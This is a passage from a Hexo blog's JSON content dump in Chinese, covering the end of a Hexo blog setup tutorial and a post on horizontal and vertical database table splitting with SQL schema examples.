&lt;title&gt;</span><br></pre></td></tr></table></figure></p>\n<p>命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.</p>\n<p>当然也可以新建一个草稿： draft，这种布局在建立时会保存到<code>source/_drafts</code>文件夹，也可以通过<code>publish</code>来将草稿移动到正式文件夹。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 新建草稿文章</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo new draft &lt;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> 将文章正式发布</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>Front-matter</strong></p>\n<p>Front-matter是文章最上方以<code>---</code> 分割的区域，用于指定个别文件的变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">layout: 指定文章的布局属性</span><br><span class=\"line\">title： 文章标题</span><br><span class=\"line\">data：建立日期</span><br><span class=\"line\">updated： 更新日期</span><br><span class=\"line\">comments： 是否开启文章的评论功能(如果有的话)</span><br><span class=\"line\">tags： 标签</span><br><span class=\"line\">categories：分类</span><br><span class=\"line\">permalink： 覆盖文章的网址</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改美化\"><a href=\"#修改美化\" class=\"headerlink\" title=\"修改美化\"></a>修改美化</h2><p>默认的主题是有点丑，可以去<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">hexo的主题商店</a> 找一个自己喜欢的、漂亮的主题。</p>\n<p>本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">hexo nexT主题</a>，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>曾几何时，你是否也想有个自己的博客，抒发自己的心情，总结自己的得失，与人分享喜悦、哀伤、愤怒、忧愁，那么这篇文章你就必须看了，非常简单搭建一个自己的开源博客。</p>\n<h2 id=\"一、预备\"><a href=\"#一、预备\" class=\"headerlink\" title=\"一、预备\"></a>一、预备</h2><p><strong>1、安装Nodejs及npm</strong></p>\n<p>Nodejs下载地址： <a href=\"https://nodejs.org/zh-cn/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://nodejs.org/zh-cn/download/</a></p>\n<p><strong>2、安装Git</strong></p>\n<p>Git下载地址： <a href=\"https://git-scm.com/download/\" target=\"_blank\" rel=\"noopener\">官网下载地址：https://git-scm.com/download/</a></p>\n<p>安装完成后，执行如下命令，可以显示版本号就算安装成功了  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span> node -v</span><br><span class=\"line\">v9.11.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span> npm -v</span><br><span class=\"line\">6.3.0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">$</span> git --version</span><br><span class=\"line\">git version 2.17.0.windows.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、安装hexo\"><a href=\"#二、安装hexo\" class=\"headerlink\" title=\"二、安装hexo\"></a>二、安装hexo</h2><p>进入命令行，执行如下命令:  </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、全局安装hexo</span><br><span class=\"line\"><span class=\"meta\">$</span> npm install hexo -g</span><br><span class=\"line\"></span><br><span class=\"line\">2、创建hexo工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span> mkdir hexo-blog</span><br><span class=\"line\"><span class=\"meta\">$</span> cd hexo-blog</span><br><span class=\"line\"></span><br><span class=\"line\">3、初始化工作目录</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo init</span><br><span class=\"line\"></span><br><span class=\"line\">4、本地启动hexo</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo serve</span><br></pre></td></tr></table></figure>\n<p>到此一个hexo博客已经搭建完成了，可以访问 <a href=\"http://localhost:4000/\" target=\"_blank\" rel=\"noopener\">http://localhost:4000/</a> 查看博客的效果。</p>\n<p><br></p>\n<p>当然现在你就可以开始写博客了，默认的配置足够你写作、发表文章了，但是默认的东西有些并不符合自己的要求和审美。所以下面对hexo进行一些配置，以符合自己的要求。</p>\n<h2 id=\"三、hexo配置\"><a href=\"#三、hexo配置\" class=\"headerlink\" title=\"三、hexo配置\"></a>三、hexo配置</h2><p>hexo的配置文件在根目录下_config.yml文件中。本文仅列举几项，其余配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">hexo官网文档</a>进行配置，当然，有兴趣可以参照<a href=\"https://github.com/AriesRen/ariesren.github.io\" target=\"_blank\" rel=\"noopener\">我的配置</a></p>\n<p>网站配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\"><span class=\"attr\">title:</span> <span class=\"string\">Aries'</span> <span class=\"string\">blog</span> <span class=\"string\">网站标题</span></span><br><span class=\"line\"><span class=\"attr\">subtitle:</span> <span class=\"string\">副标题</span></span><br><span class=\"line\"><span class=\"attr\">description:</span> <span class=\"string\">我不生产知识，我只是知识的搬运工。</span> <span class=\"string\">网站一句话描述</span></span><br><span class=\"line\"><span class=\"attr\">keywords:</span> <span class=\"string\">关键词</span></span><br><span class=\"line\"><span class=\"attr\">author:</span> <span class=\"string\">无名万物</span> <span class=\"string\">作者</span></span><br><span class=\"line\"><span class=\"attr\">language:</span> <span class=\"string\">zh-CN</span> <span class=\"string\">语言</span></span><br><span class=\"line\"><span class=\"attr\">timezone:</span> <span class=\"string\">Asia/Shanghai</span> <span class=\"string\">时区</span></span><br></pre></td></tr></table></figure></p>\n<p>文章配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">url:</span> <span class=\"attr\">http://blog.renhj.org</span>  <span class=\"string\">网站url</span></span><br><span class=\"line\"><span class=\"attr\">root:</span> <span class=\"string\">/</span>   <span class=\"string\">文章根路径</span></span><br><span class=\"line\"><span class=\"attr\">permalink:</span> <span class=\"string\">posts/:year-:month-:day-:title.html</span>  <span class=\"string\">文章url</span></span><br><span class=\"line\"><span class=\"attr\">permalink_defaults:</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"四、创建新文章\"><a href=\"#四、创建新文章\" class=\"headerlink\" title=\"四、创建新文章\"></a>四、创建新文章</h2><p>你可以通过以下命令来创建一篇新文章<br><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure></p>\n<p>命令中指令文章的布局，默认为post，可以通过修改_config.yml中的default_layout来修改默认布局，当然也可以在文章Front-Matter上添加布局.</p>\n<p>当然也可以新建一个草稿： draft，这种布局在建立时会保存到<code>source/_drafts</code>文件夹，也可以通过<code>publish</code>来将草稿移动到正式文件夹。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span> 新建草稿文章</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo new draft &lt;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span> 将文章正式发布</span><br><span class=\"line\"><span class=\"meta\">$</span> hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>Front-matter</strong></p>\n<p>Front-matter是文章最上方以<code>---</code> 分割的区域，用于指定个别文件的变量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">layout: 指定文章的布局属性</span><br><span class=\"line\">title： 文章标题</span><br><span class=\"line\">data：建立日期</span><br><span class=\"line\">updated： 更新日期</span><br><span class=\"line\">comments： 是否开启文章的评论功能(如果有的话)</span><br><span class=\"line\">tags： 标签</span><br><span class=\"line\">categories：分类</span><br><span class=\"line\">permalink： 覆盖文章的网址</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<h2 id=\"修改美化\"><a href=\"#修改美化\" class=\"headerlink\" title=\"修改美化\"></a>修改美化</h2><p>默认的主题是有点丑，可以去<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">hexo的主题商店</a> 找一个自己喜欢的、漂亮的主题。</p>\n<p>本人找的是网上比较流行的nexT的主题，即本博客所使用的主题：<a href=\"http://theme-next.iissnan.com/\" target=\"_blank\" rel=\"noopener\">hexo nexT主题</a>，更多的配置可以参照nexT官网的配置或者其他文章进行配置。本文就不再这里赘述的，具体效果可以看本博客的。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"数据库拆分","date":"2018-11-26T09:30:10.000Z","_content":"\n\n### 一、数据库的拆分\n\n当数据库的数据量非常大时，**水平拆分**和**垂直拆分**是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。\n\n假设我们在数据库中有用户表\n```sql\ncreate table user(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\tsign varchar(64),\n\tintro varchar(256)\n\t...\n)engine=innodb charset=utf8;\n```\n\n**水平拆分**是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：\n\t（1）每个库（表）的结构都一样\n\t（2）每个库（表）的数据不一样，没有交集\n\t（3）所有库（表）的并集是全量数据\n\n\n**垂直拆分**是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：\n\t（1）每个库（表）的结构都不一样\n\t（2）一般来说每个库（表）的属性至少有一列交集，一般是主键\n\t（3）所有库（表）的数据并集是全量数据\n\n以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：\n\n```sql\ncreate table user_base(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\t...\n)\n\ncreate table user_ext(\n\tid bigint,\n\tsign varchar(64),\n\tintro varchar(256),\n\t...\n)\n```\n\n从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。\n\n\n### 二、垂直拆分的依据是什么\n\n那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：\n（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表\n（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表\n（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里\n\n优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。\n\n一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，**当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。**\n\n原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。\n（1）join更消耗数据库性能\n（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。\n\n\n### 三、为什么要这样拆分\n\n为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：\n（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里\n（2）内存buffer缓存数据是以row为单位的\n（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据\n（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO\n\n还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：\n（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据\n（2）user_ext访问频率低，一行大小0.9k\n拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。\n\n\n### 四、总结\n\n1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段\n2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性\n3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/数据库拆分.md","raw":"---\ntitle: 数据库拆分\ndate: 2018-11-26 17:30:10\ntags: ['分布式', '数据库拆分', '大数据']\ncategories: 架构\n---\n\n\n### 一、数据库的拆分\n\n当数据库的数据量非常大时，**水平拆分**和**垂直拆分**是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。\n\n假设我们在数据库中有用户表\n```sql\ncreate table user(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\tsign varchar(64),\n\tintro varchar(256)\n\t...\n)engine=innodb charset=utf8;\n```\n\n**水平拆分**是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：\n\t（1）每个库（表）的结构都一样\n\t（2）每个库（表）的数据不一样，没有交集\n\t（3）所有库（表）的并集是全量数据\n\n\n**垂直拆分**是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：\n\t（1）每个库（表）的结构都不一样\n\t（2）一般来说每个库（表）的属性至少有一列交集，一般是主键\n\t（3）所有库（表）的数据并集是全量数据\n\n以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：\n\n```sql\ncreate table user_base(\n\tid bigint,\n\tname varchar(50),\n\tpassword varchar(32),\n\tage int,\n\tsex tinyint,\n\temail varchar(32),\n\t...\n)\n\ncreate table user_ext(\n\tid bigint,\n\tsign varchar(64),\n\tintro varchar(256),\n\t...\n)\n```\n\n从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。\n\n\n### 二、垂直拆分的依据是什么\n\n那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：\n（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表\n（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表\n（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里\n\n优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。\n\n一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，**当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。**\n\n原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。\n（1）join更消耗数据库性能\n（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。\n\n\n### 三、为什么要这样拆分\n\n为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：\n（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里\n（2）内存buffer缓存数据是以row为单位的\n（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据\n（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO\n\n还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：\n（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据\n（2）user_ext访问频率低，一行大小0.9k\n拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。\n\n\n### 四、总结\n\n1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段\n2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性\n3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"数据库拆分","published":1,"updated":"2018-11-29T09:59:50.697Z","_id":"cjpdmv003000g4cv0opuhcf0w","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"一、数据库的拆分\"><a href=\"#一、数据库的拆分\" class=\"headerlink\" title=\"一、数据库的拆分\"></a>一、数据库的拆分</h3><p>当数据库的数据量非常大时，<strong>水平拆分</strong>和<strong>垂直拆分</strong>是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。</p>\n<p>假设我们在数据库中有用户表<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">user</span>(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>)</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)<span class=\"keyword\">engine</span>=<span class=\"keyword\">innodb</span> <span class=\"keyword\">charset</span>=utf8;</span><br></pre></td></tr></table></figure></p>\n<p><strong>水平拆分</strong>是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是：<br>    （1）每个库（表）的结构都一样<br>    （2）每个库（表）的数据不一样，没有交集<br>    （3）所有库（表）的并集是全量数据</p>\n<p><strong>垂直拆分</strong>是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是：<br>    （1）每个库（表）的结构都不一样<br>    （2）一般来说每个库（表）的属性至少有一列交集，一般是主键<br>    （3）所有库（表）的数据并集是全量数据</p>\n<p>以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_base(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> user_ext(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span class=\"number\">256</span>),</span><br><span class=\"line\">\t...</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。</p>\n<h3 id=\"二、垂直拆分的依据是什么\"><a href=\"#二、垂直拆分的依据是什么\" class=\"headerlink\" title=\"二、垂直拆分的依据是什么\"></a>二、垂直拆分的依据是什么</h3><p>那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：<br>（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表<br>（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表<br>（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里</p>\n<p>优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。</p>\n<p>一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，<strong>当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。</strong></p>\n<p>原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。<br>（1）join更消耗数据库性能<br>（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。</p>\n<h3 id=\"三、为什么要这样拆分\"><a href=\"#三、为什么要这样拆分\" class=\"headerlink\" title=\"三、为什么要这样拆分\"></a>三、为什么要这样拆分</h3><p>为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：<br>（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里<br>（2）内存buffer缓存数据是以row为单位的<br>（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据<br>（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO</p>\n<p>还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：<br>（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据<br>（2）user_ext访问频率低，一行大小0.9k<br>拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。</p>\n<h3 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h3><p>1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段<br>2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性<br>3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中</p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"一、数据库的拆分\"><a href=\"#一、数据库的拆分\" class=\"headerlink\" title=\"一、数据库的拆分\"></a>一、数据库的拆分</h3><p>当数据库的数据量非常大时，<strong>水平拆分</strong>和<strong>垂直拆分</strong>是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。</p>\n<p>假设我们在数据库中有用户表<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> <span class=\"keyword\">user</span>(</span><br><span class=\"line\">\t<span class=\"keyword\">id</span> <span class=\"built_in\">bigint</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">name</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">50</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">password</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\tage <span class=\"built_in\">int</span>,</span><br><span class=\"line\">\tsex tinyint,</span><br><span class=\"line\">\temail <span class=\"built_in\">varchar</span>(<span class=\"number\">32</span>),</span><br><span class=\"line\">\t<span class=\"keyword\">sign</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">64</span>),</span><br><span class=\"line\">\tintro <span class=\"built_in\">varchar</span>(<span 